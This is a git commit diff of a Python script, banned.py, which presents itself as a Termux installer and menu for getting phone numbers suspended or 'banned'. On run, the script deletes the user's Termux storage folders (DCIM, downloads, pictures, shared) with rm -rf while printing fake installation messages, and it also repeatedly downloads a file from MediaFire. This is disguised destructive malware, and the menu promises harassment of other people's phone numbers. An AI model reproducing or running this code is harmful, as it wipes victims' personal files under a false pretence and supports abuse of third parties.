c359d82db132f2b9bb0670773d3f44cfbd01539e
RIP-Network <93273837+RIP-Network@users.noreply.github.com>
2022-06-14 16:34:03 +0000

    Update banned.py

--- banned.py
+++ banned.py
@@ -1,33 +1,47 @@
 import os, sys, time, io
 
-class color:
-    morado = '\033[95m'
-    blanco = '\033[97m'
-    cyan = '\033[96m'
-    azul  = '\033[94m'
-    verde = '\033[92m'
-    amarillo = '\033[93m'
-    rojo = '\033[91m'
-    fin = '\033[0m'
+#colores
+negro = '\033[30m'
+rojo = '\033[31m'
+verde = '\033[32m'
+amarillo = '\033[33m'
+azul = '\033[34m'
+rosado = '\033[35m'
+calipso= '\033[36m'
+blanco = '\033[37m'
+cierre = '\033[39m'
+
+
 
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
+time.sleep(2)
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
+os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
 
 print("Preparando instalacion por favor espere......")
-time.sleep(3)
+time.sleep(2)
+print("Gracias por usar el progrma")
+time.sleep(1)
 print("Instalacion Completada")
 time.sleep(2)
+os.system("clear")
+
 def menu():
-    print("    ELIGA UNA OPCIÓN ")
-    print("")
-    print("[1]SOPORTE")
-    print("[2]SUSPENDER")
-    print("[3]DEJAR EN -1")
-    print("[0]SALIR")
-    eleccion =input("ELIJE UNA OPCIÓN >>")
+    print("    ELIGA UNA OPCION ")
+    print("Version 2.0 ")
+    print("[1]DEJAR EN SOPORTE")
+    print("[2]SUSPENDER NUMERO")
+    print("[3]DEJAR EN -1 UN NUMERO")
+    print("[0]SALIR DEL MENU")
+    eleccion =input("ELIJE UNA OPCION >>")
     if eleccion == "1" :
      os.system("termux-open-url https://piv.pivpiv.dk/")
     elif eleccion == "2" :
